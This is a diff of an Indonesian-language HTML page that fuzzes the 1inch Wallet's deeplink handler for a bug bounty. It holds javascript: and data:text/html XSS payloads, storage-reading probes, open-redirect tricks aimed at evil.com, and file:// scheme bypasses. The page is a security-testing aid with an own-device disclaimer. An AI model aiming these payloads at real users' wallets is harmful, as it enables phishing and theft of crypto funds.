@@ -1,59 +1,69 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>1inch Deeplink Fuzzer - Ethical Test</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>iOS 1inch Fuzzer - Ethical</title>
 <style>
- body{background:#0f0f0f;color:#fff;font-family:monospace;padding:15px}
- button{width:100%;padding:12px;margin:6px 0;background:#222;color:#fff;border:1px solid #444;border-radius:8px;text-align:left}
- h3{color:#f5ff00;margin-top:25px}.p1{border-left:3px solid red}.p2{border-left:3px solid orange}
- small{color:#888}
+ body{background:#000;color:#fff;font-family:-apple-system;padding:16px}
+ button{width:100%;padding:14px;margin:7px 0;background:#1c1c1e;color:#fff;border:1px solid #333;border-radius:12px;text-align:left;font-size:14px}
+.p1{border-left:4px solid #ff3b30}.p2{border-left:4px solid #ffcc00}
+ h3{margin-top:28px;font-size:15px;color:#aaa}
+ #log{margin-top:20px;background:#111;padding:12px;border-radius:10px;word-break:break-all;font-size:12px;color:#0f0}
 </style>
 </head>
 <body>
-<h2>1inch Wallet Deeplink Fuzzer</h2>
-<small>Hanya test di device sendiri. Jangan pakai untuk phishing. Target: P1 XSS / Open Redirect</small>
 
-<h3>[P1] XSS via javascript: scheme</h3>
-<button class="p1" onclick="go('javascript:alert(document.domain)')">1. javascript:alert(domain)</button>
-<button class="p1" onclick="go('javascript:alert(localStorage.getItem(`WALLET`))')">2. javascript: try read storage</button>
-<button class="p1" onclick="go('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')">3. data:text/html XSS</button>
+<h2>iOS 1inch Wallet Fuzzer</h2>
+<p style="color:#888;font-size:12px">Hanya test di device sendiri. Target bug bounty: XSS & Open Redirect tanpa warning.</p>
 
-<h3>[P1] File / Deeplink scheme bypass</h3>
-<button onclick="go('file:///etc/hosts')">4. file:/// bypass</button>
-<button onclick="go('content://settings/system')">5. content:// bypass</button>
+<h3>[P1] XSS - kalau alert muncul di dalam Wallet = P1</h3>
+<button class="p1" onclick="go('javascript:alert(document.domain)')">[P1-1] javascript:alert(domain)</button>
+<button class="p1" onclick="go('javascript:alert(localStorage.length)')">[P1-2] javascript: read storage</button>
+<button class="p1" onclick="go('data:text/html,<script>alert(document.domain)</script>')">[P1-3] data:text/html</button>
+<button class="p1" onclick="go('data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+')">[P1-4] data base64</button>
 
-<h3>[P2] Open Redirect & Phishing (no warning?)</h3>
-<button class="p2" onclick="go('https://evil.com')">6. https://evil.com - ada warning gak?</button>
-<button class="p2" onclick="go('https://app.1inch.io@evil.com')">7. https://app.1inch.io@evil.com (at-trick)</button>
-<button class="p2" onclick="go('https://app-1inch-io.evil.com')">8. typosquatting domain</button>
+<h3>[P2] Open Redirect - harusnya ada warning</h3>
+<button class="p2" onclick="go('https://evil.com')">[P2-1] https://evil.com - ada warning?</button>
+<button class="p2" onclick="go('https://app.1inch.io@evil.com')">[P2-2] @ trick</button>
+<button class="p2" onclick="go('https://app-1inch-io.com')">[P2-3] typosquat</button>
+<button class="p2" onclick="go('https://app.1inch.io%09@evil.com')">[P2-4] tab bypass</button>
 
-<h3>[P2] URL Param Injection</h3>
-<button onclick="go('https://app.1inch.io/?callback=https://evil.com')">9.?callback=evil.com</button>
-<button onclick="go('https://app.1inch.io#@evil.com')">10. hash @evil.com</button>
-<button onclick="go('https://app.1inch.io%0Aevil.com')">11. newline injection</button>
+<h3>[INFO] Harus berhasil</h3>
+<button onclick="go('https://app.1inch.io')">[OK] Normal 1inch</button>
+<button onclick="go('https://app.uniswap.org')">[OK] Uniswap</button>
 
-<h3>[INFO] Normal Behavior (Harus Sukses)</h3>
-<button onclick="go('https://app.1inch.io')">12. Normal 1inch - HARUS BISA</button>
-<button onclick="go('https://app.uniswap.org')">13. Uniswap - boleh gak?</button>
+<div id="log">Ready. Buka dari Safari iOS, jangan dari dalam wallet.</div>
 
 <script>
-const SCHEME = "oneinch://open_url?url=";
 function go(payload){
-  const finalUrl = SCHEME + encodeURIComponent(payload);
-  console.log(finalUrl);
-  document.getElementById('log').innerText = "Trying: " + finalUrl;
-  window.location.href = finalUrl;
+  const encoded = encodeURIComponent(payload);
+  // iOS pakai scheme langsung
+  const deeplink = `oneinch://open_url?url=${encoded}`;
+
+  document.getElementById('log').innerText = "Trying: " + deeplink;
+
+  // iOS butuh user gesture, jadi pakai click langsung
+  window.location.href = deeplink;
+
+  // Fallback App Store kalau app gak ada (jangan hapus)
+  setTimeout(()=>{
+    // kalau masih di Safari, artinya gagal buka wallet
+    if(document.hasFocus()){
+      document.getElementById('log').innerText += "\n-> Gagal, wallet tidak terinstall atau diblokir";
+    }
+  }, 2000);
 }
 </script>
 
-<div id="log" style="margin-top:20px;background:#111;padding:10px;word-break:break-all;border-radius:8px;"></div>
-
-<p style="margin-top:30px;color:#555;font-size:11px">
-BUG VALID kalau: No 1-5 muncul alert di DALAM DApp Browser 1inch Wallet.<br>
-BUG VALID kalau: No 6-8 langsung kebuka tanpa ada warning "You are visiting external site".<br>
-BUKAN BUG kalau: Cuma bisa buka aplikasi dari Chrome, itu fitur by design.
+<div style="margin-top:30px;padding:12px;background:#1c1c1e;border-radius:10px">
+<b style="font-size:12px">BUG VALID:</b>
+<p style="font-size:11px;color:#888;line-height:1.5">
+1. Klik P1-1 sampai P1-4 -> kalau muncul alert di DALAM DApp Browser 1inch (bukan di Safari), itu XSS P1. Stop test, langsung report ke Bugcrowd 1inch.<br><br>
+2. Klik P2-1 -> kalau langsung buka evil.com di dalam wallet TANPA ada popup warning "You are visiting external site" -> itu Open Redirect P2.<br><br>
+BUKAN BUG: Bisa buka wallet dari Safari. Itu memang fitur.
 </p>
+</div>
+
 </body>
 </html>
